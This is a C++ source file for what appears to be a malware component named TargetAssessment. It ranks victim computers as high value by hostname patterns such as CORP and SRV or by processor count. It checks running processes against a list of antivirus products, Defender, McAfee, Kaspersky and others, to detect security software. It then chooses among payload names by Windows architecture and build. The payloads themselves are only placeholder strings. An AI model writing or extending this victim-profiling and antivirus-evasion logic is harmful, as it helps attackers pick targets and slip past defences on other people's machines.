#include "targetassessment.hpp"

bool TargetAssessment::isHighValueTarget(const std::string& computerName, int processors)
{
    if (computerName.find("CORP") != std::string::npos ||
        computerName.find("SRV") != std::string::npos ||
        computerName.find("WORKSTATION") != std::string::npos) {
        return true;
    }

    if (processors >= 12) {
        return true;
    }

    return false;
}

bool TargetAssessment::detectSecuritySoftware(const std::vector<std::string>& processes)
{
    std::vector<std::string> securityKeywords = {
        "defender", "mcafee", "norton", "kaspersky", "bitdefender",
        "avast", "avg", "malwarebytes", "sophos", "trend"
    };

    for (const auto& process : processes) {
        for (const auto& keyword : securityKeywords) {
            if (process.find(keyword) != std::string::npos) {
                return true;
            }
        }
    }
    return false;
}

std::string TargetAssessment::selectPayload(const std::string& architecture, const std::string& build)
{
    if (architecture == "x64" && std::stoi(build) >= 19041) { return "advanced_x64_payload"; }
    else if (architecture == "x86") { return "legacy_x86_payload"; }
    else { return "basic_payload"; }
}